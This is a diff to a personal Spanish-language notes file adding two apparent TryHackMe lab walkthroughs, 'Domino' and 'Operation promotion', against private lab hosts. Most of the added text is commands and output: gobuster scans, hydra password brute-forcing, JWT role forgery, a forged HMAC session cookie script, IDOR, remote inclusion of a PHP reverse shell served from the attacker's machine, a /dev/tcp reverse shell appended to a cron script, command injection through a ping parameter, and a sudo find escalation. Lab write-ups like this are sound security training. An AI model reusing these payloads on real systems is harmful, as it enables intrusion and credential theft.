@@ -780,7 +780,7 @@ Verbosidad y depuración
       </row>
     </table>
   </node>
-  <node unique_id="39" master_id="0" name="Machines" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1763918886" ts_lastsave="1774377125">
+  <node unique_id="39" master_id="0" name="Machines" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1763918886" ts_lastsave="1789934270">
     <node unique_id="37" master_id="0" name="Vulnversity" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1763830750" ts_lastsave="1777087121">
       <rich_text>root@ip-10-67-98-199:~# sudo nmap -sX -sV -p- 10.67.148.3
 sudo: unable to resolve host ip-10-67-98-199: Name or service not known
@@ -4026,6 +4026,423 @@ Contador de intentos fallidos de contraseña:
           <cell>Mejor Para</cell>
         </row>
       </table>
+    </node>
+    <node unique_id="53" master_id="0" name="Domino" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1789934219" ts_lastsave="1789934220">
+      <rich_text>curl -sI 10.64.140.115
+HTTP/1.1 200 OK
+Date: Sat, 19 Sep 2026 21:07:44 GMT
+Server: Apache/2.4.58 (Ubuntu)
+Content-Type: text/html; charset=UTF-8
+
+
+gobuster dir -u </rich_text>
+      <rich_text link="webs http://10.64.140.115">http://10.64.140.115</rich_text>
+      <rich_text> -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,js,txt
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     </rich_text>
+      <rich_text link="webs http://10.64.140.115">http://10.64.140.115</rich_text>
+      <rich_text>
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              php,html,js,txt
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/.php                 (Status: 403) [Size: 278]
+/.html                (Status: 403) [Size: 278]
+/index.php            (Status: 200) [Size: 861]
+/support              (Status: 301) [Size: 316] [--&gt; </rich_text>
+      <rich_text link="webs http://10.64.140.115/support/]">http://10.64.140.115/support/]</rich_text>
+      <rich_text>
+/admin                (Status: 301) [Size: 314] [--&gt; </rich_text>
+      <rich_text link="webs http://10.64.140.115/admin/]">http://10.64.140.115/admin/]</rich_text>
+      <rich_text>
+/static               (Status: 301) [Size: 315] [--&gt; </rich_text>
+      <rich_text link="webs http://10.64.140.115/static/]">http://10.64.140.115/static/]</rich_text>
+      <rich_text>
+/team.php             (Status: 200) [Size: 3747]
+/api                  (Status: 301) [Size: 312] [--&gt; </rich_text>
+      <rich_text link="webs http://10.64.140.115/api/]">http://10.64.140.115/api/]</rich_text>
+      <rich_text>
+/javascript           (Status: 301) [Size: 319] [--&gt; </rich_text>
+      <rich_text link="webs http://10.64.140.115/javascript/]">http://10.64.140.115/javascript/]</rich_text>
+      <rich_text>
+/logout.php           (Status: 302) [Size: 0] [--&gt; /index.php]
+/config.php           (Status: 200) [Size: 0]
+/backup               (Status: 301) [Size: 315] [--&gt; </rich_text>
+      <rich_text link="webs http://10.64.140.115/backup/]">http://10.64.140.115/backup/]</rich_text>
+      <rich_text>
+/forgot.php           (Status: 200) [Size: 684]
+/403.php              (Status: 200) [Size: 322]
+/auth.php             (Status: 200) [Size: 0]
+/dashboard.php        (Status: 302) [Size: 0] [--&gt; /index.php]
+/reset.php            (Status: 200) [Size: 410]
+/.html                (Status: 403) [Size: 278]
+/.php                 (Status: 403) [Size: 278]
+/server-status        (Status: 403) [Size: 278]
+Progress: 1102800 / 1102805 (100.00%)
+===============================================================
+Finished
+===============================================================
+root@ip-10-64-69-234:~# 
+
+
+
+esto tenemos en static/app.js
+// NexusCorp Portal - Frontend Utilities
+// v2.3.1 - Build 20241115
+
+(function() {
+    'use strict';
+
+    // Configuration (TODO: move to env before prod deployment - laura 2024-10-22)
+    const CONFIG = {
+        apiBase: '/api',
+        // Encryption key for backup config decryption - AES-ECB-128
+        // Key: N3xusK3y2024!!  (pad to 16 bytes with  )
+        _backupKey: 'N3xusK3y2024!!',
+        appVersion: '2.3.1'
+    };
+
+    // Session helper
+    window.NexusApp = {
+        getSession: function() {
+            const cookie = document.cookie.split(';').find(c =&gt; c.trim().startsWith('nexus_session='));
+            if (!cookie) return null;
+            try {
+                return JSON.parse(atob(cookie.split('=')[1].trim()));
+            } catch(e) { return null; }
+        },
+        getApiToken: function() {
+            return localStorage.getItem('nexus_jwt');
+        },
+        setApiToken: function(token) {
+            localStorage.setItem('nexus_jwt', token);
+        }
+    };
+
+    // Auto-fetch JWT if not cached
+    if (!localStorage.getItem('nexus_jwt') &amp;&amp; document.cookie.includes('nexus_session')) {
+        fetch('/api/auth/token.php', {credentials: 'include'})
+            .then(r =&gt; r.json())
+            .then(d =&gt; { if (d.token) localStorage.setItem('nexus_jwt', d.token); })
+            .catch(() =&gt; {});
+    }
+})();
+
+
+vamos a la ruta de backup y descargamos el archivo config.enc, luego lo desencriptamos con la clave en app.js: openssl enc -d -aes-128-ecb -in archivo.enc -out salida -K $(echo -n 'N3xusK3y2024!!' | xxd -p) -nopad
+
+{"app_name":"NexusCorp Portal","version":"2.3.1","deploy_env":"production","system_user":"devops"}
+
+
+
+hydra -l devops -P /usr/share/wordlists/SecLists/Passwords/xato-net-10-million-passwords-10000.txt http-post-form "/index.php:username=^USER^&amp;password=^PASS^:F=Invalid credentials" -o resultado.txt
+cat resultado.txt
+
+hydra -L usernames.txt -P /usr/share/wordlists/rockyou.txt 10.67.188.139 http-post-form '/index.php:username=^USER^&amp;password=^PASS^:Invalid credentials' -o resultado.txt
+cat resultado.txt
+
+
+
+root@ip-10-67-108-10:~# hydra -L usernames.txt -P /usr/share/wordlists/rockyou.txt -t 64 10.67.188.139 http-post-form '/index.php:username=^USER^&amp;password=^PASS^:Invalid credentials'
+Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (</rich_text>
+      <rich_text link="webs https://github.com/vanhauser-thc/thc-hydra">https://github.com/vanhauser-thc/thc-hydra</rich_text>
+      <rich_text>) starting at 2026-09-20 02:33:14
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 64 tasks per 1 server, overall 64 tasks, 100410786 login tries (l:7/p:14344398), ~1568919 tries per task
+[DATA] attacking http-post-form://10.67.188.139:80/index.php:username=^USER^&amp;password=^PASS^:Invalid credentials
+[STATUS] 1440.00 tries/min, 1440 tries in 00:01h, 100409346 to do in 1162:09h, 64 active
+[STATUS] 1450.33 tries/min, 4351 tries in 00:03h, 100406435 to do in 1153:50h, 64 active
+[80][http-post-form] host: 10.67.188.139   login: laura.hayes
+[80][http-post-form] host: 10.67.188.139   login: michael.chen
+[80][http-post-form] host: 10.67.188.139   login: sarah.johnson   password: password
+[80][http-post-form] host: 10.67.188.139   login: robert.wilson   password: password
+[80][http-post-form] host: 10.67.188.139   login: emma.taylor   password: password
+[STATUS] 10246062.71 tries/min, 71722439 tries in 00:07h, 28688347 to do in 00:03h, 64 active
+[80][http-post-form] host: 10.67.188.139   login: david.brown
+[STATUS] 7172444.58 tries/min, 86069335 tries in 00:12h, 14341451 to do in 00:02h, 64 active
+[STATUS] 6620830.00 tries/min, 86070790 tries in 00:13h, 14339996 to do in 00:03h, 64 active
+[80][http-post-form] host: 10.67.188.139   login: james.wright
+1 of 1 target successfully completed, 7 valid passwords found
+Hydra (</rich_text>
+      <rich_text link="webs https://github.com/vanhauser-thc/thc-hydra">https://github.com/vanhauser-thc/thc-hydra</rich_text>
+      <rich_text>) finished at 2026-09-20 02:46:42
+
+
+
+accediendo aquí: /api/auth/token.php
+vemos esto:
+token "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJzYXJhaC5qb2huc29uIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3ODk4NzI3OTksImV4cCI6MTc4OTg3NjM5OX0.dXLGjCu2wwTe66E4h91FBZKBcTWbndaeeFHaKe6JEe8"
+expires_in	3600
+note	"Use this token as: Authorization: Bearer &lt;token&gt; for /api/files.php"
+
+
+
+curl -X GET </rich_text>
+      <rich_text link="webs http://10.67.188.139/api/files.php">http://10.67.188.139/api/files.php</rich_text>
+      <rich_text> \
+  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJzYXJhaC5qb2huc29uIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3ODk4NzI3OTksImV4cCI6MTc4OTg3NjM5OX0.dXLGjCu2wwTe66E4h91FBZKBcTWbndaeeFHaKe6JEe8"
+cuando se envía se obtiene: {"error":"Admin JWT required. Check your token payload."}
+
+Mi intuición me dice que solo verifica el rol, por lo que se usó una herramienta como </rich_text>
+      <rich_text link="webs https://www.jwt.io/">https://www.jwt.io/</rich_text>
+      <rich_text> para decodificar y luego codificar el token con rol de admin
+curl -X GET </rich_text>
+      <rich_text link="webs http://10.67.188.139/api/files.php?name=/var/www/html/config.php">http://10.67.188.139/api/files.php?name=/var/www/html/config.php</rich_text>
+      <rich_text> \
+  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJzYXJhaC5qb2huc29uIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzg5ODcyNzk5LCJleHAiOjE3ODk4NzYzOTl9.SqZJlUd_mCVZB7_paJ4gMX8JgtyFXiIqMLPewFjPCn0"
+{"file":"\/var\/www\/html\/config.php","content":"&lt;?php\ndefine('DB_HOST', 'localhost');\ndefine('DB_NAME', 'nexusdb');\ndefine('DB_USER', 'app_user');\ndefine('DB_PASS', 'D3v0ps!2024');\ndefine('JWT_SECRET', 'nexus_jwt_s3cr3t_2024');\ndefine('APP_SECRET', 'nexus_app_k3y_2024');\n\nfunction get_db() {\n    $pdo = new PDO('mysql:host='.DB_HOST.';dbname='.DB_NAME, DB_USER, DB_PASS);\n    $pdo-&gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);\n    return $pdo;\n}\n?&gt;\n"}
+
+
+
+sí accedemos al perfil de usuario podemos usar idor y colocar otro id como el 1
+</rich_text>
+      <rich_text link="webs http://10.67.188.139/api/users/profile.php?id=1">http://10.67.188.139/api/users/profile.php?id=1</rich_text>
+      <rich_text>	
+id	1
+username	"laura.hayes"
+email	"laura.hayes@nexus.corp"
+role	"admin"
+notes	"THM{1d0r_h0r1z0nt4l_4cc3ss_fl4g1}"
+
+
+con los datos obtenidos crearemos una cookie con la firma y datos del admin
+import base64, hmac, hashlib, json
+
+SECRET_KEY = b"nexus_app_k3y_2024"
+user_payload = {"user_id": 1, "username": "laura.hayes", "role": "admin"}
+
+json_str = json.dumps(user_payload, separators=(',', ':'))
+base64_payload = base64.b64encode(json_str.encode()).decode()
+signature = hmac.new(SECRET_KEY, base64_payload.encode(), hashlib.sha256).hexdigest()
+
+forged_cookie = f"{base64_payload}.{signature}"
+print(forged_cookie)
+
+
+
+se hace así por atob() (decodificación base64 estándar) directamente sobre todo el valor de la cookie, esperando que sea puro JSON en base64 — no un JWT con tres partes separadas por puntos. Si le metes un JWT ahí, atob() fallaría o produciría basura, porque el JWT tiene puntos y un tercer segmento (la firma) que no es parte del JSON.
+
+
+
+curl '</rich_text>
+      <rich_text link="webs http://10.64.152.9/api/files.php?name=http://10.64.115.13:8000/reverse.php'">http://10.64.152.9/api/files.php?name=http://10.64.115.13:8000/reverse.php'</rich_text>
+      <rich_text> \
+  -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJzYXJhaC5qb2huc29uIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzg5ODcyNzk5LCJleHAiOjk5OTk5OTk5OTl9.PQyuZqH6zR4w0kxn38gvuk0x8gVZOkltdbdRaQ5kc78'
+
+
+
+dejamos un servidor con python
+python -m http.server 8000
+
+creamos un archivo reverse.php
+&lt;?php
+$sock = fsockopen("10.64.115.13", 4444);
+$proc = proc_open('/bin/sh -i', array(0 =&gt; $sock, 1 =&gt; $sock, 2 =&gt; $sock), $pipes);
+?&gt;
+
+
+creamos un listener
+nc -lvnp 4444
+
+
+salimos a los directorios de home y vemos que tenemos el usuario devops, podemos usar 'su devops' para cambiar de usuario y luego usar la contraseña encontrada 'D3v0ps!2024'
+
+
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+find / -perm -4000 -type f 2&gt;/dev/null
+
+
+descargamos el script de psy64 para monitorear procesos sin ser root y lo subimos a la máquina objetivo
+wget </rich_text>
+      <rich_text link="webs http://10.64.115.13:8002/pspy64">http://10.64.115.13:8002/pspy64</rich_text>
+      <rich_text>
+chmod +x pspy64
+./pspy64
+
+
+/opt/monitoring/health_report.sh
+
+
+echo 'bash -i &gt;&amp; /dev/tcp/10.64.115.13/3000 0&gt;&amp;1' &gt;&gt; /opt/monitoring/health_report.sh</rich_text>
+    </node>
+    <node unique_id="54" master_id="0" name="Operation promotion" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1789934270" ts_lastsave="1789934296">
+      <rich_text>curl -sI 10.65.147.84
+HTTP/1.1 200 OK
+Date: Sun, 20 Sep 2026 18:00:28 GMT
+Server: Apache/2.4.58 (Ubuntu)
+Content-Type: text/html; charset=UTF-8
+
+
+gobuster dir -u </rich_text>
+      <rich_text link="webs http://10.64.140.115">http://10.64.140.115</rich_text>
+      <rich_text> -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,js,txt
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     </rich_text>
+      <rich_text link="webs http://10.64.140.115">http://10.64.140.115</rich_text>
+      <rich_text>
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              php,html,js,txt
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+
+Error: error on running gobuster: unable to connect to </rich_text>
+      <rich_text link="webs http://10.64.140.115/:">http://10.64.140.115/:</rich_text>
+      <rich_text> Get "</rich_text>
+      <rich_text link="webs http://10.64.140.115/">http://10.64.140.115/</rich_text>
+      <rich_text>": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
+root@ip-10-65-86-165:~# gobuster dir -u </rich_text>
+      <rich_text link="webs http://10.65.147.84">http://10.65.147.84</rich_text>
+      <rich_text> -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,js,txt
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     </rich_text>
+      <rich_text link="webs http://10.65.147.84">http://10.65.147.84</rich_text>
+      <rich_text>
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              php,html,js,txt
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/.php                 (Status: 403) [Size: 277]
+/.html                (Status: 403) [Size: 277]
+/index.php            (Status: 200) [Size: 1620]
+/admin                (Status: 301) [Size: 312] [--&gt; </rich_text>
+      <rich_text link="webs http://10.65.147.84/admin/]">http://10.65.147.84/admin/]</rich_text>
+      <rich_text>
+/config               (Status: 403) [Size: 277]
+/robots.txt           (Status: 200) [Size: 32]
+/.html                (Status: 403) [Size: 277]
+/.php                 (Status: 403) [Size: 277]
+/server-status        (Status: 403) [Size: 277]
+Progress: 1102800 / 1102805 (100.00%)
+===============================================================
+Finished
+===============================================================
+
+
+accedí al login y coloqué: ' or 1=1 --
+al hacer esto pude acceder al dashboard indicando que es vulnerable a sqlinjection
+
+
+tal vez sea ideamía o no sé sí sea intención del sistema, pero tiene idor
+</rich_text>
+      <rich_text link="webs http://10.65.147.84/admin/users/lookup.php?id='cambiar">http://10.65.147.84/admin/users/lookup.php?id='cambiar</rich_text>
+      <rich_text> id'
+
+
+sqlmap -r request.txt --dbs --level=5 --risk=3
+
+sudo nmap -sV -sC --script=vuln --top-ports=1000 10.65.147.84
+
+grep -E '^[0-9]+/(tcp|udp)' result.txt
+22/tcp  open  ssh         OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
+80/tcp  open  http        Apache httpd 2.4.58 ((Ubuntu))
+139/tcp open  netbios-ssn Samba smbd 4.6.2
+445/tcp open  netbios-ssn Samba smbd 4.6.2
+
+probaremos enumerar samba y posteriormente acceder a public
+root@ip-10-65-86-165:~# smbclient -L 10.65.147.84
+Password for [WORKGROUP\root]:
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	public          Disk      
+	IPC$            IPC       IPC Service (RecruitCorp File Services)
+
+
+root@ip-10-65-86-165:~# smbclient //10.65.147.84/public
+Password for [WORKGROUP\root]:
+Try "help" to get a list of possible commands.
+smb: \&gt; ls
+  .                                   D        0  Sat May  9 22:40:25 2026
+  ..                                  D        0  Sat May  9 22:40:25 2026
+  README.txt                          N       92  Sat May  9 22:40:25 2026
+
+		40581564 blocks of size 1024. 37214360 blocks available
+smb: \&gt; get README.txt
+getting file \README.txt of size 92 as README.txt (29.9 KiloBytes/sec) (average 29.9 KiloBytes/sec)
+smb: \&gt; 
+no hay nada interesante al leerlo
+
+
+al acceder al idor de id 7 obtenemos esto:
+Service account for /admin/sysmaint-checks/ping.php. Do not disable.
+al acceder al ping.php vemos que podemos inyectar comandos, en este caso una reverse shell después del parámetro host, lo que está entre llaves:
+</rich_text>
+      <rich_text link="webs http://10.64.136.153/admin/sysmaint-checks/ping.php?host=10.64.107.227">http://10.64.136.153/admin/sysmaint-checks/ping.php?host=10.64.107.227</rich_text>
+      <rich_text>
+{bash -c 'bash -i &gt;&amp; /dev/tcp/10.64.107.227/4444 0&gt;&amp;1'}
+
+lo codificamos a url y lo mandamos una vez que tenemos un listener en nuestra máquina en el puerto 4444
+</rich_text>
+      <rich_text link="webs http://10.64.136.153/admin/sysmaint-checks/ping.php?host=10.64.107.227%0Abash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.64.107.227%2F4444%200%3E%261%27">http://10.64.136.153/admin/sysmaint-checks/ping.php?host=10.64.107.227%0Abash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.64.107.227%2F4444%200%3E%261%27</rich_text>
+      <rich_text>
+
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+instalamos hashcat y generamos esto: echo "spring2026" &gt; base.txt
+hashcat --stdout base.txt -r /usr/share/hashcat/rules/dive.rule &gt; wordlist.txt
+
+probamos acceder por ssh usando fuerza bruta:
+hydra -l jford -P wordlist.txt ssh://10.64.136.153 -t 4
+Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (</rich_text>
+      <rich_text link="webs https://github.com/vanhauser-thc/thc-hydra">https://github.com/vanhauser-thc/thc-hydra</rich_text>
+      <rich_text>) starting at 2026-09-20 19:42:52
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 99000 login tries (l:1/p:99000), ~24750 tries per task
+[DATA] attacking ssh://10.64.136.153:22/
+
+[STATUS] 36.00 tries/min, 36 tries in 00:01h, 98964 to do in 45:50h, 4 active
+[STATUS] 28.00 tries/min, 84 tries in 00:03h, 98916 to do in 58:53h, 4 active
+
+[22][ssh] host: 10.64.136.153   login: jford   password: spring2026!
+1 of 1 target successfully completed, 1 valid password found
+Hydra (</rich_text>
+      <rich_text link="webs https://github.com/vanhauser-thc/thc-hydra">https://github.com/vanhauser-thc/thc-hydra</rich_text>
+      <rich_text>) finished at 2026-09-20 19:48:01
+
+accedemos por ssh y usamos este comando para ver los permisos: sudo -l
+Matching Defaults entries for jford on recruitcorp:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User jford may run the following commands on recruitcorp:
+    (root) NOPASSWD: /usr/bin/find
+
+
+usado gtfobins vemos que podemos usar find: sudo find . -exec /bin/sh \; -quit
+
+</rich_text>
     </node>
   </node>
   <node unique_id="52" master_id="0" name="gobuster" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1774377125" ts_lastsave="1774377510">
